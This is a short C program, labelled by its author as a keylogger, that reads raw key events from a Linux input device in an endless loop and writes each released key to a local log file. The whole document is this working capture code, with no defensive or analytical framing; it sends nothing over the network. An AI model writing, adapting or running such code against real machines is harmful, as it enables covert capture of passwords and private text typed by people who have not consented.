
/*
Author: Shiv Kumar
Subject: Keyloger

*/
#include<stdlib.h>
#include<stdio.h>
#include<fcntl.h>
#include<unistd.h>
#include<linux/input.h>
#include<sys/stat.h>

//#define LOGFILE "data.txt" //file in present working directory for binary run
#define LOGFILE "keyloger/data.txt" //file for Qt


int main(int argc, char *argv)
{
int press;

struct input_event ev;

//for system keyboard in linux it may vary in your pc Pls check handler 
//int fd = open("/dev/input/event3",O_RDONLY);

//for usb keyboard driver in linux it may vary in your pc Pls check handler 
int fd = open("/dev/input/event5",O_RDONLY);

  if(fd == -1) {
    //perror("opening device");
    //exit(EXIT_FAILURE);
    printf("i am in fd -1");
     exit(0);
  } 

FILE *fp = fopen(LOGFILE, "w");
char *map = "..1234567890....qwertyuiop....asdfghjkl.....zxcvbnm";

while(1)
{

read(fd, &ev, sizeof(ev));

//for key realease
if((ev.type == EV_KEY) && (ev.value == 0)){

   fflush(fp);
  
switch(ev.code)
{
case 28: 
    fprintf(fp, "\n");
    break;
case 57:
    fprintf(fp, " ");
    break;
default:
   fprintf(fp, "%c", map[ev.code]);

}//switch
}//if


}//while end

fclose(fp);
close(fd);

}
